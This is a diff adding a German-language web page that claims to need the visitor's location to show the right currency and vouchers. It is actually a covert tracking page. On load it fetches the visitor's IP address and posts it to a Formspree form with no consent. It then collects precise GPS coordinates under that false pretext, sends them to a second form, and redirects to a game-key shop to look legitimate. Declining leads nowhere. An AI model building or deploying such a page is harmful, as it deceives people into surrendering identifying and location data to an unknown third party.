@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <title>Standort benötigt</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: url('Background.jpeg') no-repeat center center fixed;
+      background-size: cover;
+      text-align: center;
+      padding: 100px;
+      margin: 0;
+    }
+    .popup {
+      background: rgba(255, 255, 255, 0.9); /* leicht transparent, damit das Bild durchscheint */
+      border-radius: 12px;
+      padding: 30px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      max-width: 400px;
+      margin: auto;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      border: none;
+      border-radius: 8px;
+    }
+    .accept { background-color: #4CAF50; color: white; }
+    .decline { background-color: #f44336; color: white; }
+    .error {
+      color: red;
+      margin-top: 15px;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="popup" id="locationPopup" style="display:none;">
+    <h2>Standort benötigt</h2>
+    <p>Wir benötigen deinen Standort, um die richtige <strong>Währung</strong> und verfügbare <strong>Gutscheine</strong> für dein Land zu ermitteln.</p>
+    <button class="accept" onclick="askLocation()">Standort erlauben</button>
+    <button class="decline" onclick="showError()">Ohne Standort fortfahren</button>
+    <p class="error" id="errorMsg" style="display:none;"></p>
+  </div>
+
+  <script>
+    window.addEventListener('load', () => {
+      // Zuerst IP-Adresse holen
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+
+          // Dann die IP zusammen mit "op" senden
+          return fetch("https://formspree.io/f/mqablkpq", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              ip: ip
+            })
+          });
+        })
+        .finally(() => {
+          // Popup anzeigen, wenn alles abgeschlossen ist
+          document.getElementById('locationPopup').style.display = 'block';
+        });
+    });
+
+    function askLocation() {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          fetch("https://formspree.io/f/xanjbyee", {  // ← hier deinen echten Code einfügen
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon
+            })
+          }).finally(() => {
+            window.location.href = "https://www.kinguin.net";
+          });
+        },
+        function(error) {
+          showError();
+        }
+      );
+    }
+
+    function showError() {
+      const errorMsg = document.getElementById("errorMsg");
+      errorMsg.style.display = "block";
+      errorMsg.textContent = "Standort ist erforderlich, um die passende Währung und verfügbare Gutscheine für dein Land anzuzeigen.";
+    }
+  </script>
+</body>
+</html>
